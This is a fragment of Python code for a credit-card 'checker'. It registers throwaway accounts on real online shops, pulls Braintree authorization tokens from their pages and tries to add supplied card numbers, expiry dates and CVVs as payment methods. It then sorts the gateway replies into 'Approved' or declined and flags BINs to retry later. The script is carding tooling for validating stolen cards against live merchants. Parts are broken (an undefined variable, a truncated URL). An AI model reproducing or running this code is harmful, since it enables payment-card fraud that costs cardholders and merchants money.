    'sec-ch-ua': '"Not)A;Brand";v="99", "Google Chrome";v="127", "Chromium";v="127"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'document',
    'sec-fetch-mode': 'navigate',
    'sec-fetch-site': 'same-origin',
    'sec-fetch-user': '?1',
    'upgrade-insecure-requests': '1',
    'user-agent': user,
}

		
	data = {
    'payment_method': 'braintree_credit_card',
    'wc-braintree-credit-card-card-type': 'master-card',
    'wc-braintree-credit-card-3d-secure-enabled': '',
    'wc-braintree-credit-card-3d-secure-verified': '',
    'wc-braintree-credit-card-3d-secure-order-total': '0.00',
    'wc_braintree_credit_card_payment_nonce': tok,
    'wc_braintree_device_data': '',
    'wc-braintree-credit-card-tokenize-payment-method': 'true',
    'woocommerce-add-payment-method-nonce': add_nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}
		
	response = r.post('https://shop.trifectanutrition.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers, data=data)
				
			
		
		
		
	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result
def x(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx=ccx.strip()
	#ccx = g.strip().split('\n')[0]
	ccx = ccx.strip()
	parts = re.split(r'[ |/]', ccx)
	c = parts[0]
	mm = parts[1]
	ex = parts[2]
	cvc = parts[3]
	try:
	    yy = ex[2] + ex[3]
	    if '2' in ex[3] or '1' in ex[3]:
	        yy = ex[2] + '7'
	    else:
	        pass
	except:
	    yy = ex[0] + ex[1]
	    if '2' in ex[1] or '1' in ex[1]:
	        yy = ex[0] + '7'
	    else:
	        pass
	r=requests.session()
	user = user_agent.generate_user_agent()
	username = ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))
	email = f"{username}@gmail.com"
	user = generate_user_agent()
	r = requests.session()


	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	rr= r.get('ht/wp-admin/', headers=headers)
	login=findall(r'name="register-security" value="(.*?)"',rr.text)[0]

	
	
	
	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	data = {
    'pt_register_user_email': acc,
    'pt_register_user_password': acc,
    'pt_subscribe_me': 'on',
    'is_quiz': 'false',
    'action': 'pt_register_member',
    'register-security': login,
    '_wp_http_referer': '/',
}

	response = r.post('https://www.annavasily.com.au/wp-admin/admin-ajax.php', headers=headers, data=data)
	
	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}

	rrr= r.get('https://www.annavasily.com.au/my-account/add-payment-method/', headers=headers)
	nonce = re.findall(r'name="register-security" value="(.*?)"', rrr.text)[0]
	aut=rrr.text.split(r'var wc_braintree_client_token')[1].split('"')[1]
	base4=str(base64.b64decode(aut))
	auth= base4.split('"authorizationFingerprint":')[1].split('"')[1]


	headers = {
    'authority': 'payments.braintree-api.com',
    'accept': '*/*',
    'accept-language': 'ar-EG,ar;q=0.9,en-US;q=0.8,en;q=0.7',
    'authorization': f'Bearer {auth}',
    'braintree-version': '2018-05-10',
    'content-type': 'application/json',
    'origin': 'https://assets.braintreegateway.com',
    'referer': 'https://assets.braintreegateway.com/',
    'sec-ch-ua': '"Not-A.Brand";v="99", "Chromium";v="124"',
    'sec-ch-ua-mobile': '?1',
    'sec-ch-ua-platform': '"Android"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'cross-site',
    'user-agent': 'Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Mobile Safari/537.36',
}



	json_data = {
    'clientSdkMetadata': {
        'source': 'client',
        'integration': 'dropin2',
        'sessionId': 'c7ee5540-3661-4774-862f-47faddc81d09',
    },
    'query': 'mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       cardholderName       expirationMonth      expirationYear      binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }',
    'variables': {
        'input': {
            'creditCard': {
                'number': c,
                'expirationMonth': mm,
                'expirationYear': yy,
                'cvv': cvc,
            },
            'options': {
                'validate': False,
            },
        },
    },
    'operationName': 'TokenizeCreditCard',
}

	response = r.post('https://payments.braintree-api.com/graphql', headers=headers, json=json_data)
		
	tok=(response.json()['data']['tokenizeCreditCard']['token'])
	
	
	
	headers = {
'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36',
}



	data = {
    'payment_method': 'braintree_cc',
    'braintree_cc_nonce_key': tok,
    'braintree_cc_device_data': '',
    'braintree_cc_3ds_nonce_key': '',
    'braintree_cc_config_data': '{"environment":"production","clientApiUrl":"https://api.braintreegateway.com:443/merchants/579bb899ynkdj6ns/client_api","assetsUrl":"https://assets.braintreegateway.com","analytics":{"url":"https://client-analytics.braintreegateway.com/579bb899ynkdj6ns"},"merchantId":"579bb899ynkdj6ns","venmo":"off","graphQL":{"url":"https://payments.braintree-api.com/graphql","features":["tokenize_credit_cards"]},"kount":{"kountMerchantId":null},"challenges":["cvv"],"creditCards":{"supportedCardTypes":["MasterCard","Visa"]},"threeDSecureEnabled":false,"threeDSecure":null,"paypalEnabled":true,"paypal":{"displayName":"Frezia","clientId":"Abojaq-ttmvpPaC_EvacqAUCVK0vKBCN23baNaPq2GA--sPe0FsC2r4ZF3Xa5Jegjdw2sP8uaILaAVfU","assetsUrl":"https://checkout.paypal.com","environment":"live","environmentNoNetwork":false,"unvettedMerchant":false,"braintreeClientId":"ARKrYRDh3AGXDzW7sO_3bSkq-U1C7HG_uWNC-z57LjYSDNUOSaOtIa9q6VpW","billingAgreementsEnabled":true,"merchantAccountId":"freziaAUD","payeeEmail":null,"currencyIsoCode":"AUD"}}',
    '_wpnonce': nonce,
    '_wp_http_referer': '/my-account/add-payment-method/',
    'woocommerce_add_payment_method': '1',
}

	response = r.post('https://www.annavasily.com.au/my-account/add-payment-method/', headers=headers, data=data)






	text = response.text
		
	pattern = r'Status code (.*?)\s*</li>'
		
	match = re.search(pattern, text)
	if match:
		result = match.group(1)
		if 'risk_threshold' in text:
			result = "RISK: Retry this BIN later."
	else:
		if 'Nice! New payment method added' in text or 'Payment method successfully added.' in text:
			result = "1000: Approved"
		else:
			result = "Error"
	
	if 'funds' in result or 'added' in result or 'FUNDS' in result or 'CHARGED' in result or 'Funds' in result or 'avs' in result or 'postal' in result or 'approved' in result or 'Nice!' in result or 'Approved' in result or 'cvv: Gateway Rejected: cvv' in result or 'does not support this type of purchase.' in result or 'Duplicate' in result or 'Successful' in result or 'Authentication Required' in result or 'successful' in result or 'Thank you' in result or 'confirmed' in result or 'successfully' in result or 'INVALID_BILLING_ADDRESS' in result:
			return 'Approved'
	else:
		return result





